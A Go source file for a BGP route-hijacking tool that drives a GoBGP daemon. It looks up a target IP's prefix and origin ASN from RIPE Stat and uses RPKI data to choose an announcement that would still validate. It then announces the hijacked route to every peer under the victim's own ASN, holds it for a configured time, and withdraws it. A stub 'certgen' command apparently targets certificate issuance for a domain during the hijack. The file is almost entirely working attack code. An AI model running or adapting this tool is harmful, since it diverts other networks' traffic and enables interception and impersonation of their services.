package main

import (
	"context"
	"fmt"
	"log"
	"os"
	"net/http"
	"encoding/json"
	"strconv"
	"strings"
	"net"
	"time"

	api "github.com/osrg/gobgp/v3/api"
	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials/insecure"
	"google.golang.org/protobuf/types/known/anypb"
)

const (
	grpcPort = 50051
)

type RipeResponse struct {
	Data struct {
		ASNs   []string `json:"asns"`
		Prefix string   `json:"prefix"`
	} `json:"data"`
}

type Community struct {
	Name  string `json:"name"`
	Value string `json:"value"`
}

type Config struct {
	Community string `json:"community"`
	Time      int    `json:"time"` // Time in seconds to wait after hijacking
}

type RipeRpkiResponse struct {
	Data struct {
		Status         string `json:"status"`
		ValidatingROAs []struct {
			Origin     string `json:"origin"`
			Prefix     string `json:"prefix"`
			MaxLength  int    `json:"max_length"`
			Validity   string `json:"validity"`
		} `json:"validating_roas"`
	} `json:"data"`
}

var config Config

func getCurrentPrefixInfoFromRipe(ip string) (uint32, []uint32, error) {
	// Construct the API URL
	url := fmt.Sprintf("https://stat.ripe.net/data/network-info/data.json?resource=%s", ip)
	fmt.Printf("[DEBUG] Calling RIPE Network Info API: %s\n", url)

	// Make the HTTP request
	resp, err := http.Get(url)
	if err != nil {
		return 0, nil, fmt.Errorf("failed to call RIPE API: %v", err)
	}
	defer resp.Body.Close()

	// Check response status
	if resp.StatusCode != http.StatusOK {
		return 0, nil, fmt.Errorf("RIPE API returned non-200 status: %d", resp.StatusCode)
	}

	// Parse the JSON response
	var ripeResp RipeResponse
	if err := json.NewDecoder(resp.Body).Decode(&ripeResp); err != nil {
		return 0, nil, fmt.Errorf("failed to parse RIPE API response: %v", err)
	}

	// Print the ASNs and prefix
	fmt.Printf("[DEBUG] Current DFZ: %s with origin %s\n", ripeResp.Data.Prefix, ripeResp.Data.ASNs)

	// Extract prefix length from the prefix string (e.g., "103.147.22.0/24" -> 24)
	parts := strings.Split(ripeResp.Data.Prefix, "/")
	if len(parts) != 2 {
		return 0, nil, fmt.Errorf("invalid prefix format: %s", ripeResp.Data.Prefix)
	}

	prefixLen, err := strconv.ParseUint(parts[1], 10, 32)
	if err != nil {
		return 0, nil, fmt.Errorf("invalid prefix length: %s", parts[1])
	}

	// Parse all ASNs from the list
	var asns []uint32
	for _, asnStr := range ripeResp.Data.ASNs {
		asnNum, err := strconv.ParseUint(asnStr, 10, 32)
		if err != nil {
			return 0, nil, fmt.Errorf("invalid ASN format: %s", asnStr)
		}
		asns = append(asns, uint32(asnNum))
	}
	fmt.Printf("[DEBUG] Parsed ASNs: %v\n", asns)

	return uint32(prefixLen), asns, nil
}

func getCurrentRpkiInfoFromRipe(prefix string, asn uint32) (uint32, error) {
	// Construct the API URL
	url := fmt.Sprintf("https://stat.ripe.net/data/rpki-validation/data.json?resource=%d&prefix=%s", asn, prefix)
	fmt.Printf("[DEBUG] Calling RIPE RPKI Validation API: %s\n", url)

	// Make the HTTP request
	resp, err := http.Get(url)
	if err != nil {
		return 0, fmt.Errorf("failed to call RIPE API: %v", err)
	}
	defer resp.Body.Close()

	// Check response status
	if resp.StatusCode != http.StatusOK {
		return 0, fmt.Errorf("RIPE API returned non-200 status: %d", resp.StatusCode)
	}

	// Parse the JSON response
	var ripeResp RipeRpkiResponse
	if err := json.NewDecoder(resp.Body).Decode(&ripeResp); err != nil {
		return 0, fmt.Errorf("failed to parse RIPE API response: %v", err)
	}

	// Print RPKI validation information
	fmt.Printf("[DEBUG] RPKI Validation Response - Status: %s\n", ripeResp.Data.Status)
	
	// Find the maximum prefix length from valid ROAs
	var maxLength uint32
	if len(ripeResp.Data.ValidatingROAs) > 0 {
		fmt.Println("[DEBUG] Validating ROAs:")
		for _, roa := range ripeResp.Data.ValidatingROAs {
			fmt.Printf("[DEBUG]   Origin: %s, Prefix: %s, Max Length: %d, Validity: %s\n", 
				roa.Origin, roa.Prefix, roa.MaxLength, roa.Validity)
			
			// Update maxLength if this ROA is valid and has a larger max length
			if roa.Validity == "valid" && uint32(roa.MaxLength) > maxLength {
				maxLength = uint32(roa.MaxLength)
			}
		}
	} else {
		fmt.Println("[DEBUG] No validating ROAs found")
	}

	return maxLength, nil
}

func loadConfig() error {
	file, err := os.ReadFile("config.json")
	if err != nil {
		return fmt.Errorf("failed to read config file: %v", err)
	}

	if err := json.Unmarshal(file, &config); err != nil {
		return fmt.Errorf("failed to parse config file: %v", err)
	}

	return nil
}

func createCommunityAttributes() ([]*anypb.Any, error) {
	var attrs []*anypb.Any

	// Split the community value into parts
	parts := strings.Split(config.Community, ":")
	
	// Check if it starts with "large:" prefix
	if len(parts) > 0 && parts[0] == "large" {
		// Remove the "large:" prefix and process as large community
		parts = parts[1:]
		if len(parts) != 3 {
			return nil, fmt.Errorf("invalid large community format: %s", config.Community)
		}

		globalAdmin, err := strconv.ParseUint(parts[0], 10, 32)
		if err != nil {
			return nil, fmt.Errorf("invalid global admin in large community: %s", parts[0])
		}

		localData1, err := strconv.ParseUint(parts[1], 10, 32)
		if err != nil {
			return nil, fmt.Errorf("invalid local data 1 in large community: %s", parts[1])
		}

		localData2, err := strconv.ParseUint(parts[2], 10, 32)
		if err != nil {
			return nil, fmt.Errorf("invalid local data 2 in large community: %s", parts[2])
		}

		// Create the large community attribute
		largeCommunity := &api.LargeCommunitiesAttribute{
			Communities: []*api.LargeCommunity{
				{
					GlobalAdmin: uint32(globalAdmin),
					LocalData1:  uint32(localData1),
					LocalData2:  uint32(localData2),
				},
			},
		}
		largeCommunityAttr, err := anypb.New(largeCommunity)
		if err != nil {
			return nil, fmt.Errorf("failed to create large community attribute: %v", err)
		}
		attrs = append(attrs, largeCommunityAttr)
	} else if len(parts) == 2 {
		// Process as standard community
		as, err := strconv.ParseUint(parts[0], 10, 32)
		if err != nil {
			return nil, fmt.Errorf("invalid AS number in standard community: %s", parts[0])
		}

		value, err := strconv.ParseUint(parts[1], 10, 32)
		if err != nil {
			return nil, fmt.Errorf("invalid value in standard community: %s", parts[1])
		}

		// Create the standard community attribute
		community := &api.CommunitiesAttribute{
			Communities: []uint32{uint32(as<<16 | value)},
		}
		communityAttr, err := anypb.New(community)
		if err != nil {
			return nil, fmt.Errorf("failed to create standard community attribute: %v", err)
		}
		attrs = append(attrs, communityAttr)
	} else {
		return nil, fmt.Errorf("invalid community format: %s", config.Community)
	}

	return attrs, nil
}

func addRoute(client api.GobgpApiClient, ctx context.Context, prefix string, prefixLen uint32, nextHop string, asn ...uint32) error {
	// Create NLRI
	nlri, err := anypb.New(&api.IPAddressPrefix{
		Prefix:    prefix,
		PrefixLen: prefixLen,
	})
	if err != nil {
		return fmt.Errorf("failed to create NLRI: %v", err)
	}

	// Create next-hop attribute
	nextHopAttr, err := anypb.New(&api.NextHopAttribute{
		NextHop: nextHop,
	})
	if err != nil {
		return fmt.Errorf("failed to create next-hop attribute: %v", err)
	}

	// Create origin attribute (IGP)
	origin, err := anypb.New(&api.OriginAttribute{
		Origin: 0, // 0 = IGP, 1 = EGP, 2 = INCOMPLETE
	})
	if err != nil {
		return fmt.Errorf("failed to create origin attribute: %v", err)
	}

	// Create AS path attribute if ASN is provided
	var pattrs []*anypb.Any
	pattrs = append(pattrs, origin, nextHopAttr)

	if len(asn) > 0 {
		asPath := &api.AsPathAttribute{
			Segments: []*api.AsSegment{
				{
					Type:    2, // AS_SEQUENCE
					Numbers: []uint32{asn[0]},
				},
			},
		}
		asPathAttr, err := anypb.New(asPath)
		if err != nil {
			return fmt.Errorf("failed to create AS path attribute: %v", err)
		}
		pattrs = append(pattrs, asPathAttr)
	}

	// Create community attributes (both standard and large)
	communityAttrs, err := createCommunityAttributes()
	if err != nil {
		return fmt.Errorf("failed to create community attributes: %v", err)
	}
	pattrs = append(pattrs, communityAttrs...)

	path := &api.Path{
		Family: &api.Family{
			Afi:  api.Family_AFI_IP,
			Safi: api.Family_SAFI_UNICAST,
		},
		Nlri:   nlri,
		Pattrs: pattrs,
	}

	_, err = client.AddPath(ctx, &api.AddPathRequest{
		Path: path,
	})
	if err != nil {
		return fmt.Errorf("failed to add path: %v", err)
	}

	return nil
}

func clearRoutes(client api.GobgpApiClient, ctx context.Context) error {
	// List all routes first
	stream, err := client.ListPath(ctx, &api.ListPathRequest{
		TableType: api.TableType_GLOBAL,
		Family: &api.Family{
			Afi:  api.Family_AFI_IP,
			Safi: api.Family_SAFI_UNICAST,
		},
	})
	if err != nil {
		return fmt.Errorf("failed to list routes: %v", err)
	}

	// Process each route
	for {
		response, err := stream.Recv()
		if err != nil {
			break // End of stream
		}

		// Delete each route individually
		_, err = client.DeletePath(ctx, &api.DeletePathRequest{
			Path: response.Destination.Paths[0],
		})
		if err != nil {
			return fmt.Errorf("failed to delete route %s: %v", response.Destination.Prefix, err)
		}
		fmt.Printf("Deleted route: %s\n", response.Destination.Prefix)
	}

	fmt.Println("All routes cleared successfully")
	return nil
}

func determinePrefixStrategy(ip string) (uint32, uint32, error) {
	// Check if it's an IPv4 address
	prefixLen, asns, err := getCurrentPrefixInfoFromRipe(ip)

	var strategyAsn uint32
	var strategyLen uint32
	if prefixLen < 24 {
		fmt.Println("Current announcement is less than 24, more specific announcement is possible to be used")
		// Check RPKI validation for each ASN
		prefix := fmt.Sprintf("%s/%d", ip, prefixLen)
		for _, asn := range asns {
			maxRpkiLength, err := getCurrentRpkiInfoFromRipe(prefix, asn)
			if err != nil {
				fmt.Printf("[WARN] Failed to get RPKI info for ASN %d: %v\n", asn, err)
				continue
			}

			for i := prefixLen; i <= maxRpkiLength; i++ {
				prefix := fmt.Sprintf("%s/%d", ip, i)
				np, err := normalizePrefix(prefix)
				if err != nil {
					log.Fatal(err)
				}
				fmt.Printf("[DEBUG] Vailded prefix: %s with origin %d\n", np, asn)
			}
			strategyLen = maxRpkiLength
			strategyAsn = asn
		}
	} else {
		fmt.Printf("[DEBUG] Current announcement is 24\n")
		strategyAsn = asns[0]
		strategyLen = prefixLen
	}

	return strategyLen, strategyAsn, err
}

func hijackRoutes(client api.GobgpApiClient, ctx context.Context, ip string, dryrun bool, prefixLenOverride ...uint32) error {
	// Using automatic prefix length determination
	// hijackRoutes(client, ctx, "192.168.1.0", false)
	// Using a specific prefix length
	// hijackRoutes(client, ctx, "192.168.1.0", false, 16)
	
	// Get BGP neighbors
	stream, err := client.ListPeer(ctx, &api.ListPeerRequest{})
	if err != nil {
		return fmt.Errorf("failed to get neighbors: %v", err)
	}

	// Determine prefix strategy for the target IP
	var prefixLen uint32
	var asn uint32
	var err2 error
	if len(prefixLenOverride) > 0 {
		prefixLen = prefixLenOverride[0]
	} else {
		prefixLen, asn, err2 = determinePrefixStrategy(ip)
		if err2 != nil {
			return fmt.Errorf("failed to determine prefix strategy: %v", err2)
		}
	}

	fmt.Println("BGP Neighbors:")
	for {
		peer, err := stream.Recv()
		if err != nil {
			break
		}
		fmt.Printf("- Neighbor: %s, AS: %d, State: %s\n",
			peer.Peer.Conf.NeighborAddress,
			peer.Peer.Conf.PeerAsn,
			peer.Peer.State.SessionState)

		np, err := normalizePrefix(fmt.Sprintf("%s/%d", ip, prefixLen))
		if err != nil {
			log.Fatal(err)
		}

		if dryrun {
			
			fmt.Printf("[DRYRUN] Would add route %s with origin %d\n", 
				np, asn)
			continue
		}

		// Add a new route using our local address as next-hop
		err = addRoute(client, ctx, ip, prefixLen, peer.Peer.Transport.LocalAddress, asn)
		if err != nil {
			return fmt.Errorf("failed to add route to %s: %v", peer.Peer.Conf.NeighborAddress, err)
		}

		fmt.Printf("Route added successfully to %s (%s)\n", 
			peer.Peer.Conf.NeighborAddress, np)
	}

	return nil
}

func generateCertificate(client api.GobgpApiClient, ctx context.Context, domain string) error {
	// TODO: Implement certificate generation logic
	fmt.Printf("Generating certificate for domain: %s\n", domain)
	return nil
}

func normalizePrefix(ipWithPrefix string) (string, error) {
	// Split IP and prefix length
	parts := strings.Split(ipWithPrefix, "/")
	if len(parts) != 2 {
		return "", fmt.Errorf("invalid prefix format: %s", ipWithPrefix)
	}

	// Parse IP address
	ip := net.ParseIP(parts[0])
	if ip == nil {
		return "", fmt.Errorf("invalid IP address: %s", parts[0])
	}

	// Parse prefix length
	prefixLen, err := strconv.ParseUint(parts[1], 10, 32)
	if err != nil {
		return "", fmt.Errorf("invalid prefix length: %s", parts[1])
	}

	// Convert IP to 4-byte representation
	ip = ip.To4()
	if ip == nil {
		return "", fmt.Errorf("not an IPv4 address: %s", parts[0])
	}

	// Create IPNet
	ipNet := &net.IPNet{
		IP:   ip,
		Mask: net.CIDRMask(int(prefixLen), 32),
	}

	// Get network address
	network := ipNet.IP.Mask(ipNet.Mask)

	return fmt.Sprintf("%s/%d", network.String(), prefixLen), nil
}

func main() {
	// Load configuration
	if err := loadConfig(); err != nil {
		log.Fatalf("Failed to load configuration: %v", err)
	}

	if len(os.Args) < 2 {
		log.Fatal("Usage: go run main.go <command>\nCommands:\n  clear   - Clear all routes\n  hijack <ip> [--dryrun]  - Add hijack route for specified IP\n  certgen <domain> - Generate certificate for specified domain")
	}

	// Connect to GoBGP daemon
	conn, err := grpc.Dial(fmt.Sprintf("localhost:%d", grpcPort),
		grpc.WithTransportCredentials(insecure.NewCredentials()))
	if err != nil {
		log.Fatalf("Failed to connect to GoBGP: %v", err)
	}
	defer conn.Close()

	client := api.NewGobgpApiClient(conn)
	ctx := context.Background()

	switch os.Args[1] {
	case "clear":
		if err := clearRoutes(client, ctx); err != nil {
			log.Fatalf("Failed to clear routes: %v", err)
		}
		fmt.Println("Route cleared successfully")

	case "hijack":
		if len(os.Args) < 3 {
			log.Fatal("Usage: go run main.go hijack <ip> [--dryrun]")
		}
		targetIP := os.Args[2]
		dryrun := len(os.Args) > 3 && os.Args[3] == "--dryrun"
		if err := hijackRoutes(client, ctx, targetIP, dryrun); err != nil {
			log.Fatalf("Failed to hijack routes: %v", err)
		}

		// Wait for the configured time if not in dryrun mode
		if !dryrun && config.Time > 0 {
			fmt.Printf("[INFO] Waiting for %d seconds...\n", config.Time)
			time.Sleep(time.Duration(config.Time) * time.Second)
			fmt.Println("[INFO] Wait completed")
		}

		// Clear routes
		if err := clearRoutes(client, ctx); err != nil {
			fmt.Errorf("failed to clear routes: %v", err)
		}
		fmt.Println("Hijacked successfully")
		

	case "certgen":
		if len(os.Args) < 3 {
			log.Fatal("Usage: go run main.go certgen <domain>")
		}
		domain := os.Args[2]
		if err := generateCertificate(client, ctx, domain); err != nil {
			log.Fatalf("Failed to generate certificate: %v", err)
		}

	default:
		log.Fatal("Unknown command. Available commands: clear, hijack <ip> [--dryrun], certgen <domain>")
	}
} 